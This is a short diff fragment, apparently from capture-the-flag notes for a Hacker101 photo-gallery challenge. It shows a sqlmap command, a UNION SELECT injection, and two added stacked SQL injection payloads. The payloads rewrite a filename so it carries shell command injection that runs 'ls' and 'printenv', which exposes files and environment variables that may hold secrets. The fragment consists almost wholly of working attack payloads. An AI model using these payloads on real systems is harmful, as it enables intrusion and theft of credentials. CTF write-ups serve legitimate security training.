@@ -8,3 +8,10 @@ sqlmap 'https://1c394af5effe9679d5c6d0805e59f099.ctf.hacker101.com/fetch?id=2' -
 /fetch?id=4 UNION SELECT 'main.py'
 ```
 
+```bash
+/fetch?id=3; UPDATE photos SET filename=";echo $(ls)" WHERE id=3; commit;
+```
+
+```bash
+/fetch?id=3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;
+```
